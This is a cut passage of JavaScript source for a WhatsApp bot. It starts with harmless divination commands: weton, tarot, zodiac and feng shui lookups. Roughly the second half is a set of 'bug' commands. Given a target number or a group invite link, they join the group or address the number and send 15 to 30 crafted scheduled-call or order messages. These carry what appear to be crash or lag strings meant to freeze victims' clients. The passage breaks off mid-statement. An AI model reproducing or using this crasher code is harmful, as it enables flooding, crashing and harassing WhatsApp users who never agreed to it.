case 'jadianpernikahan': case 'jadiannikah': {
if (!isOwner) return m.reply('*khusus Owner*')
await Biiofc
 if (!text) throw `Example : ${prefix + command} 6, 12, 2020`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.tanggal_jadian_pernikahan(tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 Biiofc.sendText(from, `⭔ *Tanggal Pernikahan :* ${anu.message.tanggal}\n⭔ *karakteristik :* ${anu.message.karakteristik}`, m)
}
break
//=================================================//
case 'sifatusaha': {
if (!isOwner) return m.reply('*khusus Owner*')
await Biiofc
 if (!ext)throw `Example : ${prefix+ command} 28, 12, 2021`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.sifat_usaha_bisnis(tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 Biiofc.sendText(from, `⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Usaha :* ${anu.message.usaha}`, m)
}
break
//=================================================//
case 'rejeki': case 'rezeki': {
if (!isOwner) return m.reply('*khusus Owner*')
await Biiofc
 if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.rejeki_hoki_weton(tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 Biiofc.sendText(from, `⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Rezeki :* ${anu.message.rejeki}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'pekerjaan': case 'kerja': {
if (!isOwner) return m.reply('*khusus Owner*')
await Biiofc
 if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.pekerjaan_weton_lahir(tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 Biiofc.sendText(from, `⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Pekerjaan :* ${anu.message.pekerjaan}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'ramalannasib': case 'ramalnasib': case 'nasib': {
if (!isOwner) return m.reply('*khusus Owner*')
await Biiofc
 if (!text) throw `Example : 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.ramalan_nasib(tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 Biiofc.sendText(from, `⭔ *Analisa :* ${anu.message.analisa}\n⭔ *Angka Akar :* ${anu.message.angka_akar}\n⭔ *Sifat :* ${anu.message.sifat}\n⭔ *Elemen :* ${anu.message.elemen}\n⭔ *Angka Keberuntungan :* ${anu.message.angka_keberuntungan}`, m)
}
break
//=================================================//
case 'potensipenyakit': case 'penyakit': {
if (!isOwner) return m.reply('*khusus Owner*')
await Biiofc
 if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.cek_potensi_penyakit(tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 Biiofc.sendText(from, `⭔ *Analisa :* ${anu.message.analisa}\n⭔ *Sektor :* ${anu.message.sektor}\n⭔ *Elemen :* ${anu.message.elemen}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'artitarot': case 'tarot': {
if (!isOwner) return m.reply('*khusus Owner*')
await Biiofc
 if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.arti_kartu_tarot(tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 Biiofc.sendImage(from, anu.message.image, `⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Simbol Tarot :* ${anu.message.simbol_tarot}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'fengshui': {
if (!isOwner) return m.reply('*khusus Owner*')
await Biiofc
 if (!text) throw `Example : ${prefix + command} HW MODS WA, 1, 2005\n\nNote : ${prefix + command} Nama, gender, tahun lahir\nGender : 1 untuk laki-laki & 2 untuk perempuan`
 let [nama, gender, tahun] = text.split`,`
 let anu = await primbon.perhitungan_feng_shui(nama, gender, tahun)
 if (anu.status == false) return m.reply(anu.message)
 Biiofc.sendText(from, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tahun_lahir}\n⭔ *Gender :* ${anu.message.jenis_kelamin}\n⭔ *Angka Kua :* ${anu.message.angka_kua}\n⭔ *Kelompok :* ${anu.message.kelompok}\n⭔ *Karakter :* ${anu.message.karakter}\n⭔ *Sektor Baik :* ${anu.message.sektor_baik}\n⭔ *Sektor Buruk :* ${anu.message.sektor_buruk}`, m)
}
break
//=================================================//
case 'haribaik': {
if (!isOwner) return m.reply('*khusus Owner*')
await Biiofc
 if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.petung_hari_baik(tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 Biiofc.sendText(from, `⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Kala Tinantang :* ${anu.message.kala_tinantang}\n⭔ *Info :* ${anu.message.info}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'harisangar': case 'taliwangke': {
if (!isOwner) return m.reply('*khusus Owner*')
await Biiofc
 if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.hari_sangar_taliwangke(tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 Biiofc.sendText(from, `⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Info :* ${anu.message.info}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'harinaas': case 'harisial': {
if (!isOwner) return m.reply('*khusus Owner*')
await Biiofc
 if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.primbon_hari_naas(tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 Biiofc.sendText(from, `⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *Tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hari Naas :* ${anu.message.hari_naas}\n⭔ *Info :* ${anu.message.catatan}\n⭔ *Catatan :* ${anu.message.info}`, m)
}
break
//=================================================//
case 'nagahari': case 'harinaga': {
if (!isOwner) return m.reply('*khusus Owner*')
await Biiofc
 if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.rahasia_naga_hari(tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 Biiofc.sendText(from, `⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *Tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Arah Naga Hari :* ${anu.message.arah_naga_hari}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'arahrejeki': case 'arahrezeki': {
if (!isOwner) return m.reply('*khusus Owner*')
await Biiofc
 if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.primbon_arah_rejeki(tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 Biiofc.sendText(from, `⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Arah Rezeki :* ${anu.message.arah_rejeki}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'peruntungan': {
if (!isOwner) return m.reply('*khusus Owner*')
await Biiofc
 if (!text) throw `Example : ${prefix + command} HW MODS WA, 7, 7, 2005, 2022\n\nNote : ${prefix + command} Nama, tanggal lahir, bulan lahir, tahun lahir, untuk tahun`
 let [nama, tgl, bln, thn, untuk] = text.split`,`
 let anu = await primbon.ramalan_peruntungan(nama, tgl, bln, thn, untuk)
 if (anu.status == false) return m.reply(anu.message)
 Biiofc.sendText(from, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Peruntungan Tahun :* ${anu.message.peruntungan_tahun}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'weton': case 'wetonjawa': {
if (!isOwner) return m.reply('*khusus Owner*')
await Biiofc
 if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.weton_jawa(tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 Biiofc.sendText(from, `⭔ *Tanggal :* ${anu.message.tanggal}\n⭔ *Jumlah Neptu :* ${anu.message.jumlah_neptu}\n⭔ *Watak Hari :* ${anu.message.watak_hari}\n⭔ *Naga Hari :* ${anu.message.naga_hari}\n⭔ *Jam Baik :* ${anu.message.jam_baik}\n⭔ *Watak Kelahiran :* ${anu.message.watak_kelahiran}`, m)
}
break
//=================================================//
case 'sifat': case 'karakter': {
if (!isOwner) return m.reply('*khusus Owner*')
await Biiofc
 if (!text) throw `Example : ${prefix + command} HW MODS WA, 7, 7, 2005`
 let [nama, tgl, bln, thn] = text.split`,`
 let anu = await primbon.sifat_karakter_tanggal_lahir(nama, tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 Biiofc.sendText(from, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Garis Hidup :* ${anu.message.garis_hidup}`, m)
}
break
//=================================================//
case 'keberuntungan': {
if (!isOwner) return m.reply('*khusus Owner*')
await Biiofc
 if (!text) throw `Example : ${prefix + command} HW MODS WA, 7, 7, 2005`
 let [nama, tgl, bln, thn] = text.split`,`
 let anu = await primbon.potensi_keberuntungan(nama, tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 Biiofc.sendText(from, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}`, m)
}
break
//=================================================//
case 'memancing': {
if (!isOwner) return m.reply('*khusus Owner*')
await Biiofc
 if (!text) throw `Example : ${prefix + command} 12, 1, 2022`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.primbon_memancing_ikan(tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 Biiofc.sendText(from, `⭔ *Tanggal :* ${anu.message.tgl_memancing}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'masasubur': {
if (isOwner) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await Biiofc
 if (!text) throw `Example : ${prefix + command} 12, 1, 2022, 28\n\nNote : ${prefix + command} hari pertama menstruasi, siklus`
 let [tgl, bln, thn, siklus] = text.split`,`
 let anu = await primbon.masa_subur(tgl, bln, thn, siklus)
 if (anu.status == false) return m.reply(anu.message)
 Biiofc.sendText(from, `⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'zodiak': case 'zodiac': {
if (!isOwner) return m.reply('*khusus Owner*')
await Biiofc
 if (!text) throw `Example : ${prefix+ command} 7 7 2005`
 let zodiak = [
 ["capricorn", new Date(1970, 0, 1)],
 ["aquarius", new Date(1970, 0, 20)],
 ["pisces", new Date(1970, 1, 19)],
 ["aries", new Date(1970, 2, 21)],
 ["taurus", new Date(1970, 3, 21)],
 ["gemini", new Date(1970, 4, 21)],
 ["cancer", new Date(1970, 5, 22)],
 ["leo", new Date(1970, 6, 23)],
 ["virgo", new Date(1970, 7, 23)],
 ["libra", new Date(1970, 8, 23)],
 ["scorpio", new Date(1970, 9, 23)],
 ["sagittarius", new Date(1970, 10, 22)],
 ["capricorn", new Date(1970, 11, 22)]
 ].reverse()

 function getZodiac(month, day) {
 let d = new Date(1970, month - 1, day)
 return zodiak.find(([_,_d]) => d >= _d)[0]
 }
 let date = new Date(text)
 if (date == 'Invalid Date') throw date
 let d = new Date()
 let [tahun, bulan, tanggal] = [d.getFullYear(), d.getMonth() + 1, d.getDate()]
 let birth = [date.getFullYear(), date.getMonth() + 1, date.getDate()]
 let zodiac = await getZodiac(birth[1], birth[2])
 let anu = await primbon.zodiak(zodiac)
 if (anu.status == false) return m.reply(anu.message)
 Biiofc.sendText(from, `⭔ *Zodiak :* ${anu.message.zodiak}\n⭔ *Nomor :* ${anu.message.nomor_keberuntungan}\n⭔ *Aroma :* ${anu.message.aroma_keberuntungan}\n⭔ *Planet :* ${anu.message.planet_yang_mengitari}\n⭔ *Bunga :* ${anu.message.bunga_keberuntungan}\n⭔ *Warna :* ${anu.message.warna_keberuntungan}\n⭔ *Batu :* ${anu.message.batu_keberuntungan}\n⭔ *Elemen :* ${anu.message.elemen_keberuntungan}\n⭔ *Pasangan Zodiak :* ${anu.message.pasangan_zodiak}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
case 'shio': {
if (!isOwner) return m.reply('*khusus Owner*')
await Biiofc
 if (!text) throw `Example : ${prefix + command} tikus\n\nNote : For Detail https://primbon.com/shio.htm`
 let anu = await primbon.shio(text)
 if (anu.status == false) return m.reply(anu.message)
 Biiofc.sendText(from, `⭔ *Hasil :* ${anu.message}`, m)
}
break
case 'unlidelaygcnew' : {
if (!isOwner) return m.reply('*khusus Owner*')
await Biiofc
let result = args[0].split('https://chat.whatsapp.com/')[1]
let rumgc = await Biiofc.groupAcceptInvite(result)
jumlah = "30"
for (let i = 0; i < jumlah; i++) {
const cap = virtex7
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")}`,
"title": cap,
}
}), { userJid: from, quoted : m})
Biiofc.relayMessage(rumgc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
m.reply(`*Sukses mengirim Bug Ke ${rumgc} Tolong Jeda 3 Menit Yah*`)
break
//=================================================//
case 'unlilaggcnew' : {
if (!isOwner) return m.reply('*khusus Owner*')
await Biiofc
let result = args[0].split('https://chat.whatsapp.com/')[1]
let rumgc = await Biiofc.groupAcceptInvite(result)
jumlah = "30"
for (let i = 0; i < jumlah; i++) {
const cap = cttl
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")}`,
"title": cap,
}
}), { userJid: from, quoted : m})
Biiofc.relayMessage(rumgc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
m.reply(`*Sukses mengirim Bug Ke ${rumgc} Tolong Jeda 3 Menit Yah*`)
break
//=================================================//
case 'unlibomgcnew' : {
if (!isOwner) return m.reply('*khusus Owner*')
await Biiofc
let result = args[0].split('https://chat.whatsapp.com/')[1]
let rumgc = await Biiofc.groupAcceptInvite(result)
jumlah = "30"
for (let i = 0; i < jumlah; i++) {
const cap = weg
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")}`,
"title": cap,
}
}), { userJid: from, quoted : m})
Biiofc.relayMessage(rumgc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
m.reply(`*Sukses mengirim Bug Ke ${rumgc} Tolong Jeda 3 Menit Yah*`)
break
//=================================================//
case 'unlicuygcnew' :  {
if (!isOwner) return m.reply('*khusus Owner*')
await Biiofc
let result = args[0].split('https://chat.whatsapp.com/')[1]
let rumgc = await Biiofc.groupAcceptInvite(result)
jumlah = "30"
for (let i = 0; i < jumlah; i++) {
const cap = tizi
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")}`,
"title": cap,
}
}), { userJid: from, quoted : m})
Biiofc.relayMessage(rumgc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
m.reply(`*Sukses mengirim Bug Ke ${rumgc} Tolong Jeda 3 Menit Yah*`)
break
//=================================================//
case 'sendgasfulnew' : {
 if (!isOwner) return m.reply('*khusus Owner*')
await Biiofc
Pe = text.split("|")[0]+'@s.whatsapp.net'
jumlah = "30"
for (let i = 0; i < jumlah; i++) {
const cap = `${buttonkal}`
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")}`,
"title": cap,
}
}), { userJid: from, quoted : m})
Biiofc.relayMessage(Pe, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
m.reply(`*Sukses mengirim Bug Ke ${Pe} Tolong Jeda 3 Menit Yah*`)
break
//=================================================//
case 'sendunlidelaynew' : {
if (!isOwner) return m.reply('*khusus Owner*')
await Biiofc
Pe = text.split("|")[0]+'@s.whatsapp.net'
jumlah = "30"
for (let i = 0; i < jumlah; i++) {
const cap = cttl
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")}`,
"title": cap,
}
}), { userJid: from, quoted : m})
Biiofc.relayMessage(Pe, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
m.reply(`*Sukses mengirim Bug Ke ${Pe} Tolong Jeda 3 Menit Yah*`)
break
//=================================================//
case 'sendunlilagnew' : {
if (!isOwner) return m.reply('*khusus Owner*')
await Biiofc
Pe = text.split("|")[0]+'@s.whatsapp.net'
jumlah = "30"
for (let i = 0; i < jumlah; i++) {
const cap = cttl
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")}`,
"title": cap,
}
}), { userJid: from, quoted : m})
Biiofc.relayMessage(Pe, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
m.reply(`*Sukses mengirim Bug Ke ${Pe} Tolong Jeda 3 Menit Yah*`)
break
//=================================================//
case 'sendunlibomnew' : {
if (!isOwner) return m.reply('*khusus Owner*')
await Biiofc
Pe = text.split("|")[0]+'@s.whatsapp.net'
jumlah = "30"
for (let i = 0; i < jumlah; i++) {
const cap = weg
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")}`,
"title": cap,
}
}), { userJid: from, quoted : m})
Biiofc.relayMessage(Pe, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
m.reply(`*Sukses mengirim Bug Ke ${Pe} Tolong Jeda 3 Menit Yah*`)
break
//=================================================//
case 'sendunlicuynew' : {
if (!isOwner) return m.reply('*khusus Owner*')
await Biiofc
Pe = text.split("|")[0]+'@s.whatsapp.net'

jumlah = "30"
for (let i = 0; i < jumlah; i++) {
const cap = tizi
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")}`,
"title": cap,
}
}), { userJid: from, quoted : m})
Biiofc.relayMessage(Pe, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
} 
m.reply(`*Sukses mengirim Bug Ke ${Pe} Tolong Jeda 3 Menit Yah*`)
break
//=================================================//
 case 'unlitetnew' :  {
if (!isOwner) return m.reply('*khusus Owner*')
await Biiofc
jumlah = "30"
for (let i = 0; i < jumlah; i++) {
const cap = `${buttonkal}`
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")}`,
"title": cap,
}
}), { userJid: from, quoted : m})
Biiofc.relayMessage(from, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
m.reply(`*Sukses mengirim Bug Sebanyak ${jumlah} Tolong Jeda 3 Menit Yah*`)
break
//=================================================//
case 'unlidelaynew' :  {
if (!isOwner) return m.reply('*khusus Owner*')
await Biiofc
jumlah = "30"
for (let i = 0; i < jumlah; i++) {
const cap = virtex7
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")}`,
"title": cap,
}
}), { userJid: from, quoted : m})
Biiofc.relayMessage(from, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
m.reply(`*Sukses mengirim Bug Sebanyak ${jumlah} Tolong Jeda 3 Menit Yah*`)
break
//=================================================//
case 'unlilagnew' :  {
if (!isOwner) return m.reply('*khusus Owner*')
await Biiofc
jumlah = "30"
for (let i = 0; i < jumlah; i++) {
const cap = cttl
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")}`,
"title": cap,
}
}), { userJid: from, quoted : m})
Biiofc.relayMessage(from, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
m.reply(`*Sukses mengirim Bug Sebanyak ${jumlah} Tolong Jeda 3 Menit Yah*`)
break
//=================================================//
case 'unlibomnew' :  {
if (!isOwner) return m.reply('*khusus Owner*')
await Biiofc
jumlah = "30"
for (let i = 0; i < jumlah; i++) {
const cap = weg
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")}`,
"title": cap,
}
}), { userJid: from, quoted : m})
Biiofc.relayMessage(from, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
m.reply(`*Sukses mengirim Bug Sebanyak ${jumlah} Tolong Jeda 3 Menit Yah*`)
break
//=================================================//
case 'unlicuynew' :  {
if (!isOwner) return m.reply('*khusus Owner*')
await Biiofc
jumlah = "30"
for (let i = 0; i < jumlah; i++) {
const cap = `${buttonkal}`
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")}`,
"title": cap,
}
}), { userJid: from, quoted : m})
Biiofc.relayMessage(from, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
m.reply(`*Sukses mengirim Bug Sebanyak ${jumlah} Tolong Jeda 3 Menit Yah*`)
break
//=================================================//
case 'unlidocunew': {
if (!isOwner) return m.reply('*khusus Owner*')
await Biiofc
jumlah = "30"
for (let i = 0; i < jumlah; i++) {
const cap = `${buttonkal}`
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")}`,
"title": cap,
}
}), { userJid: from, quoted : m})
Biiofc.relayMessage(from, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
break

//=================================================//
case 'unlitrolinew': {
if (!isOwner) return m.reply('*khusus Owner*')
await Biiofc
jumlah = "15"
for (let i = 0; i < jumlah; i++) {
let dok = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage: {title: `© ${botname}`,jpegThumbnail: thumb}}}
var order = generateWAMessageFromContent(from, proto.Message.fromObject({
"orderMessage": {
"orderId": "599519108102353",
"thumbnail": virgam,
"itemCount": 1999,
"status": "INQUIRY",
"surface": "CATALOG",
"message": `${botname}`,
"orderTitle": " BUG TROLI ", // 
"sellerJid": "6281214281312@s.whatsapp.net",
"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
}
}), { userJid: from, quoted : m})
Biiofc.relayMessage(from, order.message, { messageId: order.key.id })
await sleep(3000)
}
}
break
//=================================================//
case 'unlivirtextnew' :  {
if (!isOwner) return m.reply('*khusus Owner*')
await Biiofc
jumlah = "30"
for (let i = 0; i < jumlah; i++) {
const cap = `${buttonkal}`
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")}`,
"title": cap,
}
}), { userJid: from, quoted : m})
Biiofc.relayMessage(from, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
m.reply(`*Sukses mengirim Bug Sebanyak ${jumlah} Tolong Jeda 3 Menit Yah*`)
break
//=================================================//
case 'sendunlidocunew': {
if (!isOwner) return m.reply('*khusus Owner*')
await Biiofc
if (args.length < 1) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281214281312`)
bnnd = text.split("|")[0]+'@s.whatsapp.net'
jumlah = "15"
for (let i = 0; i < jumlah; i++) {
const cap = `${buttonkal}`
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")}`,
"title": cap,
}
}), { userJid: from, quoted : m})
Biiofc.relayMessage(bnnd, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
m.reply(`*Sukses mengirim Bug Ke ${bnnd} Tolong Jeda 3 Menit Yah*`)
break
//=================================================//
case 'sendunlitrolinew': {
if (!isOwner) return m.reply('*khusus Owner*')
await Biiofc
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281214281312`)
bnnd = text.split("|")[0]+'@s.whatsapp.net'
jumlah = "15"
for (let i = 0; i < jumlah; i++) {
let dok = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage: {title: `© ${botname}`,jpegThumbnail: thumb}}}
var order = generateWAMessageFromContent(from, proto.Message.fromObject({
"orderMessage": {
"orderId": "599519108102353",
"thumbnail": virgam,
"itemCount": 1999,
"status": "INQUIRY",
"surface": "CATALOG",
"message": `${botname}`,
"orderTitle": " BUG TROLI ", // 
"sellerJid": "6281214281312@s.whatsapp.net",
"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
}
}), { userJid: from, quoted:m})
Biiofc.relayMessage(bnnd, order.message, { messageId: order.key.id })
}
m.reply(`*Sukses mengirim Bug Ke ${bnnd} Tolong Jeda 3 Menit Yah*`)
}
break
case 'gasfullgcnew' : {
 if (!isOwner) return m.reply('*khusus Premium*')
 await Biiofc
let result = args[0].split('https://chat.whatsapp.com/')[1]
let rumgc = await Biiofc.groupAcceptInvite(result)
jumlah = "30"
for (let i = 0; i < jumlah; i++) {
const cap = `${buttonkal}`
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")}`,
"title": cap,
}
}), { userJid: from, quoted : m})
Biiofc.relayMessage(rumgc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
m.reply(`*Sukses mengirim Bug Ke ${rumgc} Tolong Jeda 3 Menit Yah*`)
break
case 'sendinvite': case 'sendinvite2': case 'sendinvite3': case 'sendinvite4': case 'sendinvite5':{
if (!isOwner) return reply('Maaf Fitur Ini Untuk Pengguna Premium Khusus Untuk Group => Jika Ingin Menggunakan Di chat Pribadi Harap Anda Telah Di aksess Owner Di Chat Pribady Anda')
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285691304150`)
bnnd = text.split("|")[0]+'@s.whatsapp.net'
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/mamak.jpg') }, { upload: Biiofc.waUploadToServer })
var groupInvite = generateWAMessageFromContent(from, proto.Message.fromObject({
"groupInviteMessage": {
"groupJid": "status@broadcast",
"inviteCode": "wFHwtOxGQN8OwK2x",
"inviteExpiration": `MY NAME BII BOTZ${buttonkal}`,
